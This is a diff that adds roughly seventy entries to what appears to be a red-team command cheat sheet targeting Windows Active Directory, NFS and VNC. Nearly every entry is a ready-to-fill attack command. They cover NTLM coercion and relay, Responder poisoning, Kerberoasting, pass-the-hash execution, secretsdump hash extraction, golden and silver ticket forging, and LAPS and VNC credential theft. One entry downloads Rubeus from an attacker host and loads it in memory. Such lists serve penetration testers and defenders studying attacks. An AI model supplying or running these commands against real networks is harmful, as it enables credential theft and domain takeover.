@@ -1104,5 +1104,537 @@ var data = [
         "information": "Stealthy psexec",
         "command": "python3 scshell.py -service-name [service-name|defragsvc] -hashes :[ntlm-hash] [domain]/[user]@[ip]",
         "link": "https://github.com/Mr-Un1k0d3r/SCShell"
-    }
+    },
+    {
+        "id": 151,
+        "tool": "coercer",
+        "category": "RECON",
+        "information": "Coercer - list vulns",
+        "command": "coercer.py -d '[domain]' -u '[user]' -p '[password]' --listener [hackerIp] [targetIp]",
+        "link": "https://github.com/p0dalirius/Coercer"
+    },
+    {
+        "id": 152,
+        "tool": "coercer",
+        "category": "RECON",
+        "information": "Coercer - webdav",
+        "command": "coercer.py -d '[domain]' -u '[user]' -p '[password]' --webdav-host '[responder-machine-name]' [target-ip]",
+        "link": "https://github.com/p0dalirius/Coercer"
+    },
+    {
+        "id": 153,
+        "tool": "coercer",
+        "category": "RECON",
+        "information": "Coercer - list vulns many targets",
+        "command": "coercer.py -d '[domain]' -u '[user]' -p '[password]' --listener [hacker-ip] --target-file [target-file]",
+        "link": "https://github.com/p0dalirius/Coercer"
+    },
+    {
+        "id": 154,
+        "tool": "responder",
+        "category": "ATTACK/MITM",
+        "information": "Responder - Launch",
+        "command": "responder -I [interface]",
+        "link": "https://github.com/lgandx/Responder"
+    },
+    {
+        "id": 155,
+        "tool": "responder",
+        "category": "RECON",
+        "information": "Responder - Launch analyze mode (no poisoning)",
+        "command": "responder -I [interface] -A",
+        "link": "https://github.com/lgandx/Responder"
+    },
+    {
+        "id": 156,
+        "tool": "responder",
+        "category": "ATTACK/MITM",
+        "information": "Responder - Launch with wpad file",
+        "command": "respond -I [interface] --wpad",
+        "link": "https://github.com/lgandx/Responder"
+    },
+    {
+        "id": 157,
+        "tool": "responder",
+        "category": "UTILS",
+        "information": "Responder - http on",
+        "command": "sed -i 's/HTTP = Off/HTTP = On/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'HTTP ='",
+        "link": "https://github.com/lgandx/Responder"
+    },
+    {
+        "id": 158,
+        "tool": "responder",
+        "category": "UTILS",
+        "information": "Responder - http off",
+        "command": "sed -i 's/HTTP = On/HTTP = Off/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'HTTP ='",
+        "link": "https://github.com/lgandx/Responder"
+    },
+    {
+        "id": 159,
+        "tool": "responder",
+        "category": "UTILS",
+        "information": "Responder - smb on",
+        "command": "sed -i 's/SMB = Off/SMB = On/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'SMB ='",
+        "link": "https://github.com/lgandx/Responder"
+    },
+    {
+        "id": 160,
+        "tool": "responder",
+        "category": "UTILS",
+        "information": "Responder - smb off",
+        "command": "sed -i 's/SMB = On/SMB = Off/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'SMB ='",
+        "link": "https://github.com/lgandx/Responder"
+    },
+    {
+        "id": 161,
+        "tool": "responder",
+        "category": "UTILS",
+        "information": "Responder - challenge set",
+        "command": "sed -i 's/Challenge =.*$/Challenge = <challenge>/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'Challenge ='",
+        "link": "https://github.com/lgandx/Responder"
+    },
+    {
+        "id": 162,
+        "tool": "responder",
+        "category": "UTILS",
+        "information": "Responder - challenge reset",
+        "command": "sed -i 's/Challenge =.*$/Challenge = /g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'Challenge ='",
+        "link": "https://github.com/lgandx/Responder"
+    },
+    {
+        "id": 163,
+        "tool": "responder",
+        "category": "UTILS",
+        "information": "multirelay attack - user filtered (previous disable HTTP and SMB in Responder.conf)",
+        "command": "multirelay -t [ip] -u [user1] [user2]",
+        "link": "https://github.com/lgandx/Responder"
+    },
+    {
+        "id": 164,
+        "tool": "responder",
+        "category": "UTILS",
+        "information": "multirelay attack - all user (previous disable HTTP and SMB in Responder.conf)",
+        "command": "multirelay -t [ip] -u all",
+        "link": "https://github.com/lgandx/Responder"
+    },
+    {
+        "id": 165,
+        "tool": "rubeus",
+        "category":"UTILS",
+        "information": "Rubeus - inject ticket from file",
+        "command": "Rubeus.exe ptt /ticket:<ticket>",
+        "link": "https://github.com/GhostPack/Rubeus"
+    },
+    {
+        "id": 166,
+        "tool": "rubeus",
+        "category":"UTILS",
+        "information": "Rubeus - load from powershell",
+        "command": "$data = (New-Object System.Net.WebClient).DownloadData('http://[lhost]/Rubeus.exe');$assem = [System.Reflection.Assembly]::Load($data);",
+        "link": "https://github.com/GhostPack/Rubeus"
+    },
+    {
+        "id": 167,
+        "tool": "rubeus",
+        "category":"UTILS",
+        "information": "Rubeus - execute from powershell",
+        "command": "[Rubeus.Program]::MainString(\"klist\");",
+        "link": "https://github.com/GhostPack/Rubeus"
+    },
+    {
+        "id": 168,
+        "tool": "rubeus",
+        "category":"ATTACK/EXPLOIT",
+        "information": "Rubeus - monitor",
+        "command": "Rubeus.exe monitor /interval:5 /filteruser:[machine_account]",
+        "link": "https://github.com/GhostPack/Rubeus"
+    },
+    {
+        "id": 169,
+        "tool": "rubeus",
+        "category":"UTILS",
+        "information": "Rubeus - inject ticket from b64 blob",
+        "command": "Rubeus.exe ptt /ticket:<base64_ticket>",
+        "link": "https://github.com/GhostPack/Rubeus"
+    },
+    {
+        "id": 170,
+        "tool": "rubeus",
+        "category":"ATTACK/EXPLOIT",
+        "information": "Rubeus - ASREP Roasting for all users in current domain",
+        "command": "Rubeus.exe asreproast /format:[AS_REP_response_format] /outfile:hashes.txt",
+        "link": "https://github.com/GhostPack/Rubeus"
+    },
+    {
+        "id": 171,
+        "tool": "rubeus",
+        "category":"ATTACK/EXPLOIT",
+        "information": "Rubeus - ASREP Roasting for a specific user",
+        "command": "Rubeus.exe asreproast /user:[username] /domain:[domain] /format:[AS_REP_response_format] /outfile:hashes.txt",
+        "link": "https://github.com/GhostPack/Rubeus"
+    },
+    {
+        "id": 172,
+        "tool": "rubeus",
+        "category":"ATTACK/EXPLOIT",
+        "information": "Rubeus - Kerberoasting current domain",
+        "command": "Rubeus.exe kerberoast /outfile:hashes.txt [/rc4opsec] [/aes]",
+        "link": "https://github.com/GhostPack/Rubeus"
+    },
+    {
+        "id": 173,
+        "tool": "rubeus",
+        "category":"ATTACK/EXPLOIT",
+        "information": "Rubeus - Kerberoasting specific user",
+        "command": "Rubeus.exe kerberoast /user:[username] /domain:[domain] /outfile:hashes.txt /simple",
+        "link": "https://github.com/GhostPack/Rubeus"
+    },
+    {
+        "id": 174,
+        "tool": "rubeus",
+        "category":"POST-EXPLOITATION",
+        "information": "Rubeus - get hash from user",
+        "command": "Rubeus.exe hash /user:[username] /domain:[domain] /password:[password]",
+        "link": "https://github.com/GhostPack/Rubeus"
+    },
+    {
+        "id": 175,
+        "tool": "rubeus",
+        "category":"POST-EXPLOITATION",
+        "information": "Rubeus - dump tickets",
+        "command": "Rubeus.exe dump",
+        "link": "https://github.com/GhostPack/Rubeus"
+    },
+    {
+        "id": 176,
+        "tool": "rubeus",
+        "category":"ATTACK/CONNECT",
+        "information": "Rubeus - ask and inject ticket",
+        "command": "Rubeus.exe asktgt /user:[username] /domain:[domain] /rc4:[ntlm-hash] /ptt",
+        "link": "https://github.com/GhostPack/Rubeus"
+    },
+    {
+        "id": 178,
+        "tool": "rubeus",
+        "category":"ATTACK/EXPLOIT",
+        "information": "Rubeus - S4U with ticket constrained delegation",
+        "command": "Rubeus.exe s4u /ticket:[ticket] /impersonateuser:[user] /msdsspn:ldap/[domain_fqdn] /altservice:cifs /ptt",
+        "link": "https://github.com/GhostPack/Rubeus"
+    },
+    {
+        "id": 179,
+        "tool": "rubeus",
+        "category":"ATTACK/EXPLOIT",
+        "information": "Rubeus - S4U with hash constrained delegation",
+        "command": "Rubeus.exe s4u /user:[user] /rc4:[ntlm-hash] /impersonateuser:[user] /msdsspn:ldap/[domain_fqdn] /altservice:cifs /domain:[domain_fqdn] /ptt",
+        "link": "https://github.com/GhostPack/Rubeus"
+    },
+    {
+        "id": 180,
+        "tool": "rubeus",
+        "category":"POST-EXPLOITATION",
+        "information": "Rubeus - get rc4 of machine with the password",
+        "command": "Rubeus.exe hash /password:[password]",
+        "link": "https://github.com/GhostPack/Rubeus"
+    },
+    {
+        "id": 181,
+        "tool": "Metasploit - msf",
+        "category":"POST-EXPLOITATION",
+        "information": "Metasploit - get laps password",
+        "command": "msfconsole -x \"use post/windows/gather/credentials/laps; set session [session_id]; run\"",
+        "link": "https://www.metasploit.com/"
+    },
+    {
+        "id": 182,
+        "tool": "mitm6",
+        "category":"ATTACK/MITM",
+        "information": "mitm6 - launch (to run with impacket-ntlmrelayx)",
+        "command": "mitm6 -d [domain]",
+        "link": "https://github.com/dirkjanm/mitm6"
+    },
+    {
+        "id": 183,
+        "tool": "impacket",
+        "category":"ATTACK/CONNECT",
+        "information": "psexec with username",
+        "command": "psexec.py [domain]/[user]:[password]@[ip]",
+        "link": "https://github.com/fortra/impacket"
+    },
+    {
+        "id": 184,
+        "tool": "impacket",
+        "category":"ATTACK/CONNECT",
+        "information": "psexec with pass the hash",
+        "command": "psexec.py -hashes [hash] [user]@[ip]",
+        "link": "https://github.com/fortra/impacket"
+    },
+    {
+        "id": 185,
+        "tool": "impacket",
+        "category":"ATTACK/CONNECT",
+        "information": "psexec with kerberos",
+        "command": "export KRB5CCNAME=[ccache_file]; psexec.py -dc-ip [dc_ip] -target-ip [ip] -no-pass -k [domain]/[user]@[target_name]",
+        "link": "https://github.com/fortra/impacket",
+    },
+    {
+        "id": 186,
+        "tool": "impacket",
+        "category":"ATTACK/CONNECT",
+        "information": "smbexec with username",
+        "command": "smbexec.py [domain]/[user]:[password]@[ip]",
+        "link": "https://github.com/fortra/impacket"
+    },
+    {
+        "id": 187,
+        "tool": "impacket",
+        "category":"ATTACK/CONNECT",
+        "information": "smbexec with pass the hash",
+        "command": "smbexec.py -hashes [hash] [user]@[ip]",
+        "link": "https://github.com/fortra/impacket"
+    },
+    {
+        "id": 188,
+        "tool": "impacket",
+        "category":"ATTACK/CONNECT",
+        "information": "smbexec with kerberos",
+        "command": "export KRB5CCNAME=[ccache_file]; smbexec.py -dc-ip [dc_ip] -target-ip [ip] -no-pass -k [domain]/[user]@[target_name]",
+        "link": "https://github.com/fortra/impacket"
+    },
+    {
+        "id": 189,
+        "tool": "impacket",
+        "category":"ATTACK/CONNECT",
+        "information": "wmiexec with username",
+        "command": "wmiexec.py [domain]/[user]:[password]@[ip]",
+        "link": "https://github.com/fortra/impacket"
+    },
+    {
+        "id": 190,
+        "tool": "impacket",
+        "category":"ATTACK/CONNECT",
+        "information": "wmiexec with pass the hash",
+        "command": "wmiexec.py -hashes [hash] [user]@[ip]",
+        "link": "https://github.com/fortra/impacket"
+    },
+    {
+        "id": 191,
+        "tool": "impacket",
+        "category":"ATTACK/CONNECT",
+        "information": "atexec - execute command view the task scheduler",
+        "command": "atexec.py [domain]/[user]:[password]@[ip] \"[command]\"",
+        "link": "https://github.com/fortra/impacket"
+    },
+    {
+        "id": 192,
+        "tool": "impacket",
+        "category":"ATTACK/CONNECT",
+        "information": "atexec - execute command view the task scheduler with pass the hash",
+        "command": "atexec.py -hashes [hash] [user]@[ip] \"[command]\"",
+        "link": "https://github.com/fortra/impacket"
+    },
+    {
+        "id": 193,
+        "tool": "impacket",
+        "category":"POST-EXPLOITATION",
+        "information": "secretsdump - dump hashes",
+        "command": "secretsdump.py [domain]/[user]:[password]@[ip]",
+        "link": "https://github.com/fortra/impacket"
+    },
+    {
+        "id": 194,
+        "tool": "impacket",
+        "category":"POST-EXPLOITATION",
+        "information": "secretsdump - local dump extract hashes from sam database",
+        "command": "secretsdump.py -system [system_file|SYSTEM] -sam [sam_file|SAM] local",
+        "link": "https://github.com/fortra/impacket"
+    },
+    {
+        "id": 195,
+        "tool": "impacket",
+        "category":"POST-EXPLOITATION",
+        "information": "secretsdump - local dump extract hashes from ntds database",
+        "command": "secretsdump.py -ntds [ntds_file|NTDS.dit] -system [system_file|SYSTEM] -hashes [lmhash:nthash] local -outputfile [output_file]",
+        "link": "https://github.com/fortra/impacket"
+    },
+    {
+        "id": 196,
+        "tool": "impacket",
+        "category":"POST-EXPLOITATION",
+        "information": "secretsdump - anonymous get administrator",
+        "command": "secretsdump.py [domain]/[dc_bios_name]\\$/@[ip] -no-pass -just-dc-user \"Administrator\"",
+        "link": "https://github.com/fortra/impacket"
+    },
+    {
+        "id": 197,
+        "tool": "impacket",
+        "category":"POST-EXPLOITATION",
+        "information": "secretsdump - remote extract",
+        "command": "secretsdump.py -just-dc-ntlm -outputfile [output_file] [domain]/[user]:[password]@[ip]",
+        "link": "https://github.com/fortra/impacket"
+    },
+    {
+        "id": 198,
+        "tool": "impacket",
+        "category":"POST-EXPLOITATION",
+        "information": "secretsdump - remote extract and user info",
+        "command": "secretsdump.py -just-dc -pwd-last-set -user-status -outputfile [output_file] [domain]/[user]:[password]@[ip]",
+        "link": "https://github.com/fortra/impacket"
+    },
+    {
+        "id": 199,
+        "tool": "impacket",
+        "category":"ATTACK/MITM",
+        "information": "ntlmrelay - host a payload that will be served to the remote target when connecting",
+        "command": "ntlmrelayx.py -tf targets.txt -smb2support -e [payload]",
+        "link": "https://github.com/fortra/impacket"
+    },
+    {
+        "id": 200,
+        "tool": "impacket",
+        "category":"ATTACK/MITM",
+        "information": "ntlmrelay - socks",
+        "command": "ntlmrelayx.py -tf targets.txt -socks -smb2support",
+        "link": "https://github.com/fortra/impacket"
+    },
+    {
+        "id": 201,
+        "tool": "impacket",
+        "category":"ATTACK/MITM",
+        "information": "ntlmrelay - authenticate and dump hash",
+        "command": "ntlmrelayx.py -tf targets.txt -smb2support",
+        "link": "https://github.com/fortra/impacket"
+    },
+    {
+        "id": 202,
+        "tool": "impacket",
+        "category":"ATTACK/MITM",
+        "information": "ntlmrelay - to use with mitm6 - relay to target",
+        "command": "ntlmrelayx.py -6 -wh [attacker_ip] -t smb://[target] -l /tmp -socks -debug",
+        "link": "https://github.com/fortra/impacket"
+    },
+    {
+        "id": 203,
+        "tool": "impacket",
+        "category":"ATTACK/MITM",
+        "information": "ntlmrelay - to use with mitm6 - delegate access",
+        "command": "ntlmrelayx.py -t ldaps://[dc_ip] -wh [attacker_ip] --delegate-access",
+        "link": "https://github.com/fortra/impacket"
+    },
+    {
+        "id": 204,
+        "tool": "impacket",
+        "category":"ATTACK/EXPLOIT",
+        "information": "GetNPUsers - without password to get TGT (ASREPRoasting)",
+        "command": "GetNPUsers.py [domain]/[user] -no-pass -request -format hashcat",
+        "link": "https://github.com/fortra/impacket"
+    },
+    {
+        "id": 205,
+        "tool": "impacket",
+        "category":"ATTACK/EXPLOIT",
+        "information": "GetNPUsers - attempt to list and get TGTs for those users that have the property 'Do not require Kerberos preauthentication' (ASREPRoasting)",
+        "command": "GetNPUsers.py -dc-ip [dc_ip] [domain]/ -usersfile [users_file] -format hashcat",
+        "link": "https://github.com/fortra/impacket"
+    },
+    {
+        "id": 206,
+        "tool": "impacket",
+        "category":"ATTACK/EXPLOIT", 
+        "information": "GetUSERSPN - find Service Principal Names that are associated with a normal user account (kerberoasting)",
+        "command": "GetUserSPNs.py -request -dc-ip [dc_ip] [domain]/[user]:[password]",
+        "link": "https://github.com/fortra/impacket"
+    },
+    {
+        "id": 207,
+        "tool": "impacket",
+        "category":"ATTACK/EXPLOIT",
+        "information": "MS14-068 - goldenPac",
+        "command": "goldenPac.py -dc-ip [dc_ip] [domain]/[user]:'[password]'@[target]",
+        "link": "https://github.com/fortra/impacket"
+    },
+    {
+        "id": 208,
+        "tool": "impacket",
+        "category":"ATTACK/EXPLOIT",
+        "information": "Ticketer - (golden ticket) - generate TGT/TGS tickets into ccache format which can be converted further into kirbi.",
+        "command": "ticketer.py -nthash [ntlm_hash] -domain-sid [domain_sid] -domain [domain] -user [user]",
+        "link": "https://github.com/fortra/impacket"
+    },
+    {
+        "id": 209,
+        "tool": "impacket",
+        "category":"ATTACK/EXPLOIT",
+        "information": "Ticketer - (silver ticket) - generate TGS tickets into ccache format which can be converted further into kirbi.",
+        "command": "ticketer.py -nthash [ntlm_hash] -domain-sid [domain_sid] -domain [domain] -spn [spn] [user]",
+        "link": "https://github.com/fortra/impacket"
+    },
+    {
+        "id": 210,
+        "tool": "impacket",
+        "category":"ATTACK/EXPLOIT",
+        "information": "Silver ticket - impersonate user",
+        "command": "getST.py -spn cifs/[target] [domain]/[netbios_name]\\$ -impersonate [user]",
+        "link": "https://github.com/fortra/impacket"
+    },
+    {
+        "id": 211,
+        "tool": "ntfs",
+        "category":"RECON",
+        "information": "ntfs - showmount",
+        "command": "showmount -e [ip]",
+    },
+    {
+        "id": 212,
+        "tool": "nmap",
+        "category":"RECON",
+        "information": "Nmap - showmount",
+        "command": "nmap -sV --script=nfs-showmount [ip]",
+        "link": "https://nmap.org/"
+    },
+    {
+        "id": 213,
+        "tool": "ntfs",
+        "category":"ATTACK/CONNECT",
+        "information": "ntfs - mount",
+        "command": "mount -t nfs [ip]:[path] [local_path] -o nolock"
+    },
+    {
+        "id": 214,
+        "tool": "ntfs",
+        "category":"ATTACK/CONNECT",
+        "information": "ntfs - mount with v2 (no authenrt)",
+        "command": "mount -t nfs -o vers=2 [ip]:[path] [local_path] -o nolock"
+    },
+    {
+        "id": 215,
+        "tool": "nmap",
+        "category":"RECON",
+        "information": "VNC - nmap enum",
+        "command": "nmap -sV -p [Port|5900] --script=realvnc-auth-bypass,vnc-info,vnc-title [ip]",
+        "link": "https://nmap.org/"
+    },
+    {
+        "id": 216,
+        "tool": "VNC",
+        "category":"UTILS",
+        "information": "VNC - decrypt vnc.ini password",
+        "command": "echo -n <password> | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv",
+    },
+    {
+        "id": 217,
+        "tool": "Metasploit - msf",
+        "category":"ATTACK/CONNECT",
+        "information": "Metasploit - vnc test none auth",
+        "command": "msfconsole -x \"use auxiliary/scanner/vnc/vnc_none_auth; set RHOSTS [ip]; set RPORT [port]; run\"",
+        "link": "https://www.metasploit.com/"
+    },
+    {
+        "id": 218,
+        "tool": "Metasploit - msf",
+        "category":"POST-EXPLOITATION",
+        "information": "Metasploit - vnc retrieve credentials",
+        "command": "msfconsole -x \"use post/windows/gather/credentials/vnc; set SESSION <session>; run\"",
+        "link": "https://www.metasploit.com/"
+    },
 ]
